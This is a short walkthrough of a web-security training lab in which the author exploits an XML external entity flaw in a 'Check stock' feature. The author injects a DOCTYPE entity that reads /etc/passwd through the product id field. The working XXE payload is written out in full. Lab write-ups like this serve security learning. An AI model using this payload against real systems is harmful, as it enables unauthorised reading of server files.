# Lab: Exploiting XXE using external entities to retrieve files

 This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. 

# Step 1 Walk the application

I need to find where the application is parsing XML input and returning the output on the page.

![image](https://user-images.githubusercontent.com/83407557/210181022-45ace8ad-835a-4621-b8de-b179402fe960.png)

I find a XML on the /product/stock page:

![image](https://user-images.githubusercontent.com/83407557/210181064-1d5d8071-dad8-4b6b-a378-81d8f598c8e8.png)

# Step 2 test product and store id for XXE

I will use the following payload to try and get to contents of the /etc/passwd file:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

Then I will replace the id numbers with the following 

```xml
&xxe;
```

### checking product id

found vulnerable

![image](https://user-images.githubusercontent.com/83407557/210181200-66a2d1fc-08dd-45a9-ab70-94d3a8c1806a.png)

### checking store id

not found vulnerable

![image](https://user-images.githubusercontent.com/83407557/210181225-cd26e7d2-01b3-420b-a859-1af9773fbcda.png)

Finding that the product id is vulnerable, the lab is solved:

![image](https://user-images.githubusercontent.com/83407557/210181240-2c52bbdc-c68b-4e60-aeb6-9216aa2fe3b6.png)

